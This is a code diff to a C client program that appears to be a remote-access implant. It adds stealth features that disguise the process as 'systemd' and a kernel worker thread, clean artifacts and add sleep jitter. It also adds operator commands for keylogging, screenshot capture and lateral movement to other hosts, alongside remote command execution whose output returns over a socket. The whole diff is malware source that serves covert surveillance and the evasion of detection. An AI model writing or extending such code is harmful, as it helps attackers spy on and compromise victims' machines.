@@ -1,6 +1,8 @@
 #include "client_base.h"
 #include "crypto.h"
 #include "anti_debug.h"
+#include "stealth.h"
+#include "postexp.h"
 
 int main(int argc, char *argv[]) {
     int sockfd, opt;
@@ -15,6 +17,12 @@ int main(int argc, char *argv[]) {
 
     // Perform anti-debugging checks
     perform_anti_debug_checks();
+
+    // Apply stealth features
+    rename_process("systemd");
+    change_cmdline("[kworker/u8:2]");
+    clean_artifacts();
+    dynamic_sleep(5, 10); // Base time: 5 seconds, Jitter: 10 seconds
 
     // Parse command-line arguments
     while ((opt = getopt(argc, argv, "i:p:w:e:d:k:")) != -1) {
@@ -112,7 +120,24 @@ int main(int argc, char *argv[]) {
 
         if (strcmp(command, "exit") == 0) break;
 
-        execute_command_and_send_output(command, sockfd);
+        if (strcmp(command, "start_keylog") == 0) {
+            start_keylogging("keylog.txt");
+        } else if (strcmp(command, "stop_keylog") == 0) {
+            stop_keylogging();
+        } else if (strcmp(command, "capture_screenshot") == 0) {
+            capture_screenshot("screenshot.png");
+        } else if (strncmp(command, "lateral_move ", 13) == 0) {
+            char *args = command + 13;
+            char *target_ip = strtok(args, " ");
+            char *remote_command = strtok(NULL, "");
+            if (target_ip && remote_command) {
+                lateral_movement(target_ip, remote_command);
+            } else {
+                printf("Usage: lateral_move <target_ip> <command>\n");
+            }
+        } else {
+            execute_command_and_send_output(command, sockfd);
+        }
     }
 
     // Clean up
